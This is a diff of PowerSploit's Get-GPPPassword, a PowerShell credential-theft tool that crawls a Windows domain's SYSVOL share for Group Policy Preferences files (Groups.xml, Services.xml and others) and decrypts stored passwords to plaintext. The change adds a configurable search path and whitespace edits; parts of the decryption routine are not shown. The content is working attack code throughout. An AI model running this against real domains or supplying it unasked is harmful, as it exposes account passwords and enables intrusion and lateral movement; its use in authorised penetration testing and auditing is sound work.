@@ -1,9 +1,9 @@
 ﻿function Get-GPPPassword {
 <#
 .SYNOPSIS
-
+ 
     Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.
-
+ 
     PowerSploit Function: Get-GPPPassword
     Author: Chris Campbell (@obscuresec)
     License: BSD 3-Clause
@@ -11,13 +11,13 @@
     Optional Dependencies: None
  
 .DESCRIPTION
-
+ 
     Get-GPPPassword searches the domain controller for groups.xml, scheduledtasks.xml, services.xml and datasources.xml and returns plaintext passwords.
-
+ 
 .EXAMPLE
-
+ 
     Get-GPPPassword
-
+ 
 .LINK
     
     http://www.obscuresecurity.blogspot.com/2012/05/gpp-password-retrieval-with-powershell.html
@@ -26,20 +26,21 @@
     http://rewtdance.blogspot.com/2012/06/exploiting-windows-2008-group-policy.html
 #>
     
-	[CmdletBinding()]
-	Param ()
+  [CmdletBinding()]
+	Param (
+    [string] $basePath)
 	
 	#define helper function that decodes and decrypts password
 	function Get-DecryptedCpassword {
 		Param (
 		[string] $Cpassword 
 		)
-
+ 
 		try {
 			#Append appropriate padding based on string length  
 			$Mod = ($Cpassword.length % 4)
 			if ($Mod -ne 0) {$Cpassword += ('=' * (4 - $Mod))}
-
+ 
 			$Base64Decoded = [Convert]::FromBase64String($Cpassword)
 			
 			#Create a new AES .NET Crypto Object
@@ -59,15 +60,17 @@
 		
 		catch {Write-Error $Error[0]}
 	}  
-
+ 
 	#ensure that machine is domain joined and script is running as a domain account
 	if ( ( ((Get-WmiObject Win32_ComputerSystem).partofdomain) -eq $False ) -or ( -not $Env:USERDNSDOMAIN ) )
 	{
 		throw 'Machine is not joined to a domain.'
 	}
-	
+	if (!$basePath){    
+    $basePath= "\\$Env:USERDNSDOMAIN\SYSVOL"}
+    
 	#discover potential files containing passwords ; not complaining in case of denied access to a directory
-	$XMlFiles = Get-ChildItem -Path "\\$Env:USERDNSDOMAIN\SYSVOL" -Recurse -ErrorAction SilentlyContinue -Include 'Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml'
+	$XMlFiles = Get-ChildItem -Path $basePath -Recurse -ErrorAction SilentlyContinue -Include 'Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml'
 	
 	if ( -not $XMlFiles )
 	{
@@ -79,10 +82,10 @@
 		try {
 			$Filename = $File.Name
 			$Filepath = $File.VersionInfo.FileName
-
+ 
 			#put filename in $XmlFile
 			[xml] $Xml = Get-Content ($File)
-
+ 
 			#declare blank variables
 			$Cpassword = ''
 			$UserName = ''
@@ -92,7 +95,7 @@
 			$TmpAction= ''
 			
 			switch ($Filename) {
-
+ 
 				'Groups.xml' { 
 					$Xml.Groups.User | % {
 						$user =$_
@@ -201,9 +204,9 @@
 						}
 					}
 				}
-
+ 
 				
-
+ 
 				
 			}
 			
